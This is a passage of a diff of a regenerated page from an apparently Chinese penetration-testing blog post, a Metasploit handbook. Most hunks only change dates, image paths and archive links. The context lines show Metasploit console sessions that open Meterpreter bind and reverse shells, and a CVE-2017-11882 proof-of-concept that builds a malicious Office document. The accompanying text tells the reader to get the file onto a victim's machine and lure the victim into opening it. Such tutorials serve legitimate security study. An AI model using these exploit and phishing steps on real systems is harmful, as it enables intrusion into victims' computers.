(windows&#x2F;metsvc_bind_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span><br><span class="line">   LPORT     31337            yes       The listen port</span><br><span class="line">   RHOST     192.168.9.101    no        The target address</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started bind TCP handler against 192.168.9.101:31337</span><br><span class="line">[*] Meterpreter session 19 opened (192.168.9.50:1649 -&gt; 192.168.9.101:31337) at 2020-07-02 14:31:22 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
 
@@ -1410,9 +1417,9 @@ height:50vh;
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> → Qftm :&#x2F;mnt&#x2F;hgfs&#x2F;QSec&#x2F;Pentest&#x2F;网络钓鱼&#x2F;Office&#x2F;CVE-2017-11882# python Command_CVE-2017-11882.py -h</span><br><span class="line">usage: Command_CVE-2017-11882.py [-h] -c COMMAND -o OUTPUT</span><br><span class="line"></span><br><span class="line">PoC for CVE-2017-11882</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -c COMMAND, --command COMMAND</span><br><span class="line">                        Command to execute.</span><br><span class="line">  -o OUTPUT, --output OUTPUT</span><br><span class="line">                        Output exploit rtf</span><br><span class="line"> → Qftm :&#x2F;mnt&#x2F;hgfs&#x2F;QSec&#x2F;Pentest&#x2F;网络钓鱼&#x2F;Office&#x2F;CVE-2017-11882# python Command_CVE-2017-11882.py -c &quot;cmd &#x2F;c calc&quot; -o calc.doc</span><br><span class="line">[*] Done ! output file &gt;&gt; calc.doc &lt;&lt;</span><br><span class="line"> → Qftm :&#x2F;mnt&#x2F;hgfs&#x2F;QSec&#x2F;Pentest&#x2F;网络钓鱼&#x2F;Office&#x2F;CVE-2017-11882# ls</span><br><span class="line">calc.doc  Command_CVE-2017-11882.py  example  PS_shell.rb  README.md</span><br><span class="line"> → Qftm :&#x2F;mnt&#x2F;hgfs&#x2F;QSec&#x2F;Pentest&#x2F;网络钓鱼&#x2F;Office&#x2F;CVE-2017-11882#</span><br></pre></td></tr></table></figure>
 
 <p>将<code>calc.doc</code>文档以某种方式下载到受害者主机中，并诱使受害者打开该文档</p>
-<p><img src="/2020/07/04/metasploit-framework/image-20200704104601867.png" alt="image-20200704104601867"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200704104601867.png" alt="image-20200704104601867"></p>
 <p>注意：这里要注意的是生成文档的格式问题，如果你生成的是<code>docx</code>格式文档，那么则会报错显示<code>无法打开文件xxx.docx，因为内容有误</code>。。。</p>
-<p><img src="/2020/07/04/metasploit-framework/image-20200704105235549.png" alt="image-20200704105235549"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200704105235549.png" alt="image-20200704105235549"></p>
 <ul>
 <li>后门反弹</li>
 </ul>
@@ -1434,7 +1441,7 @@ height:50vh;
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(self&#x2F;Office_CVE_2017_11882) &gt; jobs </span><br><span class="line"></span><br><span class="line">Jobs</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">  Id  Name                                 Payload                          Payload opts</span><br><span class="line">  --  ----                                 -------                          ------------</span><br><span class="line">  5   Exploit: self&#x2F;Office_CVE_2017_11882  windows&#x2F;meterpreter&#x2F;reverse_tcp  tcp:&#x2F;&#x2F;192.33.6.150:8443</span><br><span class="line"></span><br><span class="line">msf5 exploit(self&#x2F;Office_CVE_2017_11882) &gt;</span><br></pre></td></tr></table></figure>
 
 <p>第四步：将<code>女孩子都有那些不为人知的密码.doc</code>文档以某种方式下载到受害者主机中，并诱使受害者打开该文档，主机上线</p>
-<p><img src="/2020/07/04/metasploit-framework/image-20200704112951729.png" alt="image-20200704112951729"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200704112951729.png" alt="image-20200704112951729"></p>
 <h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
 <li><a href="https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/" target="_blank" rel="noopener">msfconsole-commands</a></li>
 <li><a href="https://blog.xpnsec.com/becoming-system/" target="_blank" rel="noopener">Alternative methods of becoming SYSTEM</a></li>
@@ -1450,9 +1457,9 @@ height:50vh;
     
         <div class="license-wrapper">
             <p>Author：<a href="http://Qftm.github.io">Qftm</a>
-            <p>原文链接：<a href="http://qftm.github.io/2020/07/04/metasploit-framework/">http://qftm.github.io/2020/07/04/metasploit-framework/</a>
-            <p>发表日期：<a href="http://qftm.github.io/2020/07/04/metasploit-framework/">July 4th 2020, 1:25:03 pm</a>
-            <p>更新日期：<a href="http://qftm.github.io/2020/07/04/metasploit-framework/">July 4th 2020, 1:20:50 pm</a>
+            <p>原文链接：<a href="http://qftm.github.io/2020/06/20/metasploit-framework/">http://qftm.github.io/2020/06/20/metasploit-framework/</a>
+            <p>发表日期：<a href="http://qftm.github.io/2020/06/20/metasploit-framework/">June 20th 2020, 5:02:00 am</a>
+            <p>更新日期：<a href="http://qftm.github.io/2020/06/20/metasploit-framework/">July 4th 2020, 2:03:51 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -1460,12 +1467,17 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2020/06/22/pentesting1/" title= "从0到1学会搭建小型企业拓扑到由外向内的渗透测试">
+                    <div class="nextTitle">从0到1学会搭建小型企业拓扑到由外向内的渗透测试</div>
+                </a>
+            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2020/06/22/pentesting1/" title= "从0到1学会搭建小型企业拓扑到由外向内的渗透测试">
-                    <div class="prevTitle">从0到1学会搭建小型企业拓扑到由外向内的渗透测试</div>
+                <a href= "/2020/06/06/big-data-hadoop/" title= "Big Data Hadoop">
+                    <div class="prevTitle">Big Data Hadoop</div>
                 </a>
             
         </li>
@@ -2577,8 +2589,6 @@ top:50vh;
     
     
     
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 66
@@ -2598,6 +2608,11 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">06/22</span><a class="archive-post-title" href= "/2020/06/22/pentesting1/" >从0到1学会搭建小型企业拓扑到由外向内的渗透测试</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/20</span><a class="archive-post-title" href= "/2020/06/20/metasploit-framework/" >Metasploit Framework Handbook</a>
         </li>
     
     
@@ -2938,20 +2953,6 @@ top:50vh;
             <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2018/01/25/VimTerminal/" >Vim(Vi) 终端利器</a>
         </li>
     
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/07/04/metasploit-framework/" >metasploit-framework</a>
-        </li>
-    
     </div>
   </div>
         <div class="sidebar-panel-tags">
@@ -3046,6 +3047,8 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="开发"><span class="iconfont-archer">&#xe606;</span>开发</span>
     
         <span class="sidebar-tag-name" data-tags="Hadoop"><span class="iconfont-archer">&#xe606;</span>Hadoop</span>
+    
+        <span class="sidebar-tag-name" data-tags="Metasploit"><span class="iconfont-archer">&#xe606;</span>Metasploit</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
